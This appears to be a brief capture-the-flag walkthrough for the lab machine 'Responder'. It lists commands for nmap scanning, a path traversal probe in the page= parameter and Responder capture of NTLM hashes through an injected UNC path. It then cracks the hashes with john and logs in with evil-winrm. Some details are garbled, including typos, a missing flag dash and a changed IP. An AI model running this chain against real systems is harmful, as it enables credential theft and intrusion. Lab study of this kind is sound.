## Responder Analysis
# Initialize a full port scan without ping , default script, default version and save output to result.
1. nmap -sC -sV -p- --open -Pn 10.129.56.241 oN result  
# Nmap results 
1. port 80 (HTTP is running) but cannot visit the website. port 5985, port 7680 (pandu, a file transfer service) also running. 
2. Add ` 10.129.56.241  unika.htb` to `/ect/hosts`
3. Now visiting the site and clicking around,  we find that possible file inclusion vulnerabiltiy `page=` 
4. By inserting `page=../../../../etc/passwd` we figure out that the server is hosted from a windows system. 
5.  Based on the nmap scan we know that this is a windows box.
6.  We also know that the page is vulnerable to Remote file inclusion. We can try LLMNR posioning.
7.  `sudo responder -I tun0` to prepare to catch NTLM challenge/responder
8. Try to get the NTLMV1 hash by fasly connecting to SMB. add page=***//myIP/randomfile***. Save the hash to hash.txt
9. `john -w=/usr/share/wordlists/rockyou.txt hash.txt`
10. connect to windows using `evil-winrm -i 10.129.136.91 -u 'USERNAME FROM HASH'  -p 'PASSWORD FROM HASH'
